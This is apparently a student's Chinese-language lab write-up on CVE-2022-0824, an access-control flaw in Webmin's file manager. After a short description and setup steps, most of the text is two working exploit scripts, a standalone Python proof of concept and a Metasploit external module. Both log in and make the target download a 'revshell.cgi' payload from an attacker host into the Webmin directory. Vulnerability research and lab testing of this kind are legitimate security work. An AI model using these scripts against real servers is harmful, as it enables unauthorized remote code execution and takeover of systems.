---
tags: CVE
---
# cve-2022-0824

## 作者 
黃妤婷: Katherine - 國立成功大學資訊工程學系四年級

## 漏洞名稱
Webmin 訪問控制錯誤漏洞

##  漏洞說明/描述(成因)
#### 漏洞簡介:
* Webmin 是 Webmin社區的一套基於 Web 的用於類 Unix 操作系統中的系統管理工具。
* Webmin v1.984之前的版本存在訪問控制錯誤漏洞，攻擊者可以利用該漏洞執行 RCE。
* CVE-2022-0824 是 Webmin的文件管理器中存在能夠造成特權提升的漏洞，任何沒有文件管理器模組訪問權限的人可以繞過身分驗證遠程下載 .cgi 文件、修改 .cgi 文件權限(chmod)。透過在文件管理器中鏈接這些功能，可以利用 .cgi 文件實現 RCE。

Affected endpoint:
1. `http://{HOST}/extensions/file-manager/http_download.cgi`
2. `http://{HOST}/extensions/file-manager/chmod.cgi`
 
#### 漏洞類型:
* RCE
    > 遠端程式碼執行（Remote Code Execution)

#### 影響範圍:
Webmin <= 1.984

## 漏洞環境建置
* 下載漏洞版本的壓縮檔並解壓縮:
    * [1.984](https://sourceforge.net/projects/webadmin/files/webmin/1.984/)
> 可跟著 [這個網站](https://ithelp.ithome.com.tw/articles/10007033)接續後續步驟
* 進到目錄後安裝:
    ```shell
    sudo ./setup.sh
    ```
* 瀏覽器網址輸入: `http:{ip}:10000` 並輸入剛剛設定的帳號密碼後，出現以下畫面表示安裝成功
    ![](https://i.imgur.com/gfnibRQ.png)



    
---
## Metasploit testcase
* 以下是我在攻擊主機內參考[這位](https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell/blob/main/Webmin-revshell.py)以及[這位](https://github.com/cckuailong/pocsploit/blob/master/modules/cves/2022/CVE-2022-0824.py)所寫的 python POC:
    ```PYTHON
    #!/usr/bin/python3

    import requests
    import urllib3
    import argparse
    import os
    import time

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def find_url(args):
        base_url = 'http://{}:{}'.format(args['rhost'], args['RPORT'])
        return base_url

    def login(base_url, args):
        url = base_url
        print("base_url: " + url)
        path = "/session_login.cgi"
        method = "POST"
        data = { 'user' : args['username'], 'pass' : args['password'] }
        print(data)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'redirect=1;testing=1;PHPSESSID=;'
        }
        cookies = { "redirect": "1", "testing": "1", "PHPSESSID": "" }
        first_url = url + path
        print("first_url: " + first_url)
        try:
            r = requests.Session().post(first_url, data=data, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            success_message = 'System hostname'
            if success_message in r.text:
                print("[+] Login Successful")
                return True

            else:
                print("[-] Login Failed")
                return False
        except requests.Timeout as e:
            print("[-] Target: is not responding, Connection timed out")
            exit()

    def download_remote_url(base_url, args, result):
        url = base_url
        download_url = url + "/extensions/file-manager/http_download.cgi?module=filemin"
        
        headers = { 
            "Accept": "application/json, text/javascript, */*; q=0.01", 
            "Accept-Encoding": "gzip, deflate", 
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
            "X-Requested-With": "XMLHttpRequest", 
            "Referer": url + "/filemin/?xnavigation=1" 
        }

        data = {  
            'link': "http://" + args['lhost'] + ":" + args['lport'] + "/" + "revshell.cgi", 
            'username': '', 
            'password': '', 
            'path': "/usr/share/webmin"
        }
        try:
            r = requests.Session().post(download_url, data=data, headers=headers, verify=False, allow_redirects=True)
            result["success"] = True
        except:
            result["success"] = False

        return result

    def exploit(base_url, args):
        #try:
        #    r = requests.get(base_url, verify=False,timeout=3)
        #except Exception as e:
        #    print(r.status_code)
        #    return False
        if login(base_url, args) == False:
            print("Login failed")
            return False

        result = {}
        result = download_remote_url(base_url, args, result)
        print(result)
        if result["success"] == False:
            return False
        return True


    def main ():
        args = {
            'RPORT': '10000',
            'TARGETURI': '/',
            'METHOD': 'POST',
            'rhost': '192.168.179.131',
            'username': 'admin',
            'password': 'love',
            'lhost': '192.168.179.13x'
        }

        base_url = find_url(args)

        if exploit(base_url,args) :
            print("Vulnerable")
        else: 
            print("exploit Error")

    if __name__ == '__main__':
        main()
    ```


* 在靶機使用 python 確認該 POC 可行，之後在攻擊主機上試著把它改寫為 metasploit external module
    * 將檔案存在`.msf4/modules/auxiliary/scanner/http` 裡面，並命名為 `webmin_revshell.py`

        ```python
        #!/usr/bin/python3

        # standard modules
        from metasploit import module

        # extra modules
        dependencies_missing = False
        try:
            import requests
            import urllib3
            import sys
            import time
            import os
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except ImportError:
            dependencies_missing = True

        metadata = {
            'name': 'Webmin below 1.990 - File Manager privilege exploit',
            'description': '''
                Improper Access Control to Remote Code Execution in GitHub repository webmin/webmin prior to 1.990.
            ''',
            'authors': [
                'yuting',
            ],
            'date': '2022-07-30',
            'license': 'MSF_LICENSE',
            'references': [
                {'type': 'url', 'ref': 'https://github.com/cckuailong/pocsploit/blob/master/modules/cves/2022/CVE-2022-0824.py'},
                {'type': 'url', 'ref': 'https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell/blob/main/Webmin-revshell.py'},
                {'type': 'cve', 'ref': '2022-0824'}
            ],
            'type': 'single_scanner',
            'options': {
                'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '10000'},
                'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
                'METHOD': {'type': 'string', 'description': 'Vulunarable HTTP method', 'required': True, 'default': 'POST'},
                'lport': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '/'},
                'username': {'type': 'string', 'description': 'Target webmin username', 'required': True, 'default': 'admin'},
                'password': {'type': 'string', 'description': 'Target webmin password', 'required': True, 'default': '/'},
                'lhost': {'type': 'address', 'description': 'Sever address', 'required': True, 'default': '/'}
            }
        }

        def find_base_url(args):
            base_url = 'http://{}:{}'.format(args['rhost'], args['RPORT'])
            return base_url

        def login(base_url, args):
            url = base_url
            #print("base_url: " + url)
            path = "/session_login.cgi"
            method = "POST"
            data = { 'user' : args['username'], 'pass' : args['password'] }
            #print(data)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'redirect=1;testing=1;PHPSESSID=;'
            }
            cookies = { "redirect": "1", "testing": "1", "PHPSESSID": "" }
            first_url = url + path
            #print("first_url: " + first_url)
            try:
                r = requests.Session().post(first_url, data=data, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
                success_message = 'System hostname'
                if success_message in r.text:
                    module.log("[+] Login Successful", level='good')
                    return True
                else:
                    module.log("[-] Login Failed", level='error')
                    return False
            except requests.Timeout as e:
                module.log("[-] Target: is not responding, Connection timed out", level='error')
                exit()

        def download_remote_url(base_url, args, result):
            url = base_url

            '''
            try:
                second_url = url + path
                print(second_url)
                r2 = requests.Session().post(second_url, data=data, headers=headers, timeout=10, verify=False, allow_redirects=False)
                #r2 = requests.request(method=method,url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)

                #if verify_request(type="dns"):
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

            except:
                print(r2.status_code)
                result["success"] = False
            '''

            download_url = url + "/extensions/file-manager/http_download.cgi?module=filemin"
            headers = { 
                "Accept": "application/json, text/javascript, */*; q=0.01", 
                "Accept-Encoding": "gzip, deflate", 
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
                "X-Requested-With": "XMLHttpRequest", 
                "Referer": url + "/filemin/?xnavigation=1" 
            }

            data = { 
                'link': "http://" + args['lhost'] + ":" + args['lport'] + "/" + "revshell.cgi", 
                'username': '', 
                'password': '', 
                'path': "/usr/share/webmin"
            }
            try:
                r = requests.Session().post(download_url, data=data, headers=headers, verify=False, allow_redirects=True)
                result["success"] = True
            except:
                result["success"] = False

            return result

        def exploit(base_url, args):
            #try:
            #    r = requests.get(base_url, verify=False,timeout=3)
            #except Exception as e:
            #    print(r.status_code)
            #    return False
            if login(base_url, args) == False:
                return False

            result = {}
            result = download_remote_url(base_url, args, result)
            #print(result)
            if result["success"] == False:
                module.log("[-] download_remote_url() failed", level='error')
                return False
            return True

        def run(args):
            try:
                # dependency check
                if dependencies_missing:
                    module.log('Module dependency (requests) is missing, cannot continue', level='error')
                    return

                base_url = find_base_url(args)

                if exploit(base_url,args) :
                    module.log('[+] Exploit completed', level='good')
                else:
                    module.log('[-] Exploit failed', level='error')

            except Exception as e:
                module.log(str(e), level='error')

        if __name__ == '__main__':
            module.run(metadata, run)


        ```


## 在Metasploit中使用testcase, 對靶機掃描/利用成功之截圖

![](https://i.imgur.com/G2eYEod.png)



----
## reference
1. https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell/blob/main/Webmin-revshell.py
2. https://github.com/cckuailong/pocsploit/blob/master/modules/cves/2022/CVE-2022-0824.py